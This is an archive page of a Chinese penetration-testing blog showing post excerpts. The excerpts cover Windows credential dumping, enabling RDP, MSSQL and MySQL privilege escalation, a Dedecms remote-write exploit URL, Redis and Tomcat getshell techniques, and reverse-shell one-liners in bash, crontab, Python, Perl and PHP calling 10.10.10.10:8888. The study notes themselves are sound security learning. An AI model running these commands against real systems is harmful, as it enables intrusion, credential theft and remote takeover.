@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta name="generator" content="Hugo 0.21-DEV" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reber's Blog - 漏洞挖掘|渗透测试|python|php </title>
+    <meta name="keywords" content="渗透测试,漏洞挖掘,web安全,网络安全,python,php,linux">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有漏洞挖掘、渗透测试、python、php等。">
+    <meta name="author" content="reber">
+
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
+
+    <!--[if lte IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
+    <![endif]-->
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
+    <!--<![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/fonts-googleapis.css">
+
+    
+    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
+
+    
+    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
+    <script src="/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <script src="/js/jquery.min.js"></script>
+
+</head>
+<body oncopy="return false" oncontextmenu="return false">
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="/"><img src='/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+
+    
+<div class="main">
+    <div class="left">
+        <div class="content">
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/export-host-password-and-open-3389.html">导出主机密码与开启3389</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-08</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 导出主机密码hash  条件  administrator以上权限  工具  wce gethash hashdump  hash解密网站
+ http://www.objectif-securite.ch/ophcrack.php  上传工具得到hash   0x01 导出主机密码  条件  administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具  mimikatz getpass  上传工具得到密码   0x02 开启3389  直接使用注册表  写一个批处理也行
+# 3389.bat内容如下： echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/export-host-password-and-open-3389.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges.html">Windows下第三方服务提权</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-07</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        MSSQL和MySQL提权
+MSSQL提权  MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
+提权条件：数据库账号是DBA权限
+ 关于xp_cmdshell  得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &lsquo;net user&rsquo;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &lsquo;net user&rsquo;;--  连接数据库   执行系统命令   添加用户   远程连接   
+MySQL提权  环境：web应用服务器权限较低
+提权条件：MySQL是system权限
+ 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
+ UDF提权过程  导入udf.dll到服务器指定目录
+ MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
+ MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
+CREATE FUNCTION shell RETURNS STRING SONAME &lsquo;udf.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/windows-use-third-party-server-elevate-privileges.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges.html">Windows下系统漏洞提权</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-07</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         提权是在已经getshell但是权限不大的前提下做的
+0x00 查看基本信息   0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁  上传exp提权   0x03 添加用户  添加远程连接用户   0x04 使用3389远程连接   
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/linux-bounce-shell.html">Linux下反弹shell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-06</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
+0x00 Bash /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1 注：这个由解析shell的bash完成，有些时候不支持  0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9; exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)| crontab -  0x02 Python # 下面为1条命令 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'  0x03 Perl # 下面为1条命令 perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'  0x04 PHP php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'  0x05 Ruby # 下面为1条命令 ruby -rsocket -e'f=TCPSocket.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/linux-bounce-shell.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/dedecms-remote-write-file-vulnerability.html">Dedecms远程写文件漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-05</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/dedecms">dedecms</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 关于漏洞  Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞   0x01 利用条件  dedecms版本为20150618之前的 安装目录install下的index.php.bak文件未被删除   0x02 实例  查看cms版本  清空文件
+   http://www.xxxx.com/install/index.php.bak?step=11&amp;insLockfile=a &amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/ demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空， 所以就清空了config_update.php    在自己的服务器上创建文件  写入文件
+   访问http://www.xxxx.com/install/index.php.bak?step=11&amp;insLockfile=a &amp;s_lang=a&amp;install_demo_name=info.php&amp;updateHost=http://123.123.123.123/ 将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中    访问生成的文件   
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/redis-unauthorized-access.html">Redis未授权访问漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-04</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/redis">redis</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 Redis的未授权访问  若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。 若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。   0x01 向Redis服务器上传SSH公钥   0x02 通过计划任务反弹shell   
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/redis-bisis-use.html">Redis的使用</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-03</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/database">Database</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/redis">redis</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 连接Redis  # 客户端连接 $ redis-cli # 连接远程redis $ redis-cli -h host -p port -a password # 查看所有键值 127.0.0.1:6379&gt; keys * # 选择数据库 127.0.0.1:6379&gt; select 0 #可以选择0～15 # 获取redis安装目录 127.0.0.1:6379&gt; config get dir 1) &quot;dir&quot; 2) &quot;/var/lib/redis&quot; # 备份(恢复数据时只需要将备份文件放在redis安装目录即可) 127.0.0.1:6379&gt; save OK 127.0.0.1:6379&gt; exit   0x01 数据类型  String(字符串)  string是redis最基本的类型，你可以理解成与Memcached一模一样的类型，一个key对应一个value。 string类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象 。 string类型是Redis最基本的数据类型，一个键最大能存储512MB。  Hash(哈希)  Redis hash 是一个键名对集合。 Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。  List(列表)  Redis 列表是简单的字符串列表，按照插入顺序排序。 可以添加一个元素到列表的头部（左边）或者尾部（右边）。  Set(集合)  Redis的Set是string类型的无序集合。 集合内元素是唯一的，后者会覆盖前者。 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。  zset(有序集合)  Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。 zset每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。 zset的成员是唯一的,但分数(score)却可以重复。   0x02 String  # 添加键值对 127.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/redis-bisis-use.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/redis-install.html">Redis的安装</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-03</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/server">Server</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/server">server</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/redis">redis</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 关于Redis  Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库， 实现了master-slave(主从)同步,数据都是缓存在内存中的,所以可高速读写,但存储成本较高, 不适合做海量数据存储。   0x01 安装  可在http://download.redis.io/releases/ 下载
+$ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxvf redis-3.2.3.tar.gz $ cd redis-3.2.3 $ make $ make install   0x02 产生的可执行文件  redis-server：redis服务器启动程序 redis-cli：redis命令行工具，也可为客户端 redis-stat：redis状态检测工具 redis-benchmark：redis性能检测工具(读写)   0x03 配置文件  $ vim /opt/redis-3.2.3/redis.conf daemonize yes # 当值为yes时可以后台运行 bind 127.0.0.1 # 绑定ip，配置后只接受来自该ip的请求 port 6379 # 监听端口 timeout 300 # 客户端连接超时时间，单位为秒 loglevel notice # 日志等级分为4级，debug、verbose、notice、warning logfile &quot;/var/log/redis.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/redis-install.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/tomcat-deploy-war-package-to-getshell.html">Tomcat部署War包getshell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-02</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/getshell">getshell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 关于War包  War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。   0x01 上传War包GetShell  找到后台猜密码然后登录  上传War包
+先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包   0x02漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码  #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &quot;&quot;&quot; def get_username(userfile): username = [] with open(userfile, 'r') as f: lines = f.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/tomcat-deploy-war-package-to-getshell.html">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/cgi-and-fastcgi-and-php-fpm.html">CGI与FastCGI与PHP-FPM</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-02</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/php">PHP</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/cgi">cgi</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x01 CGI协议  中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议
+ 0x02 FastCGI  服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低
+fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等
+ 0x03 FastCGI工作流程  一般情况下，FastCGI的整个工作流程是这样的：
+  Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。  0x04 PHP-FPM  php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露  
+    </p>
+
+    
+</article>
+
+
+            
+
+            
+
+    
+    
+    <nav class="pagination" role="pagination">
+        
+            <a href="/page/6.html"><i class="fa fa-chevron-left"></i></a>
+        
+
+        <span>&nbsp;7 / 17&nbsp;</span>
+        
+        
+            <a href="/page/8.html"><i class="fa fa-chevron-right"></i></a>
+        
+    </nav>
+
+
+        </div>
+    </div>
+    <div class="right">
+        <div style="margin-top:10px;">
+            
+
+<div style="padding-bottom:20px;">
+
+
+    <h2 class="asidetitle">Categories</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/database" title="database">database(10)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/git" title="git">git(6)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/javascript" title="javascript">javascript(5)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/linux" title="linux">linux(25)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/miscellanea" title="miscellanea">miscellanea(3)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(13)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(64)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(11)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(34)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/server" title="server">server(10)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/windows" title="windows">windows(6)</a></li>
+        
+    </ul>
+
+
+</div>
+            
+
+<div style="padding-bottom:20px;">
+
+
+    <h2 class="asidetitle">Tags</h2>
+    <div class="taglist" id="tags">
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ajax" title="ajax">ajax</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/burpsuite" title="burpsuite">burpsuite</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/csrf" title="csrf">csrf</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/des" title="des">des</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/elevate-privileges" title="elevate-privileges">elevate-privileges</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/git" title="git">git</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/https" title="https">https</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/javascript" title="javascript">javascript</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/linux" title="linux">linux</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/module" title="module">module</a>
+                <sup>13</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/msf" title="msf">msf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mysql" title="mysql">mysql</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/nessus" title="nessus">nessus</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/php" title="php">php</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/python" title="python">python</a>
+                <sup>32</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/server" title="server">server</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/software" title="software">software</a>
+                <sup>8</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/sqlmap" title="sqlmap">sqlmap</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssh" title="ssh">ssh</a>
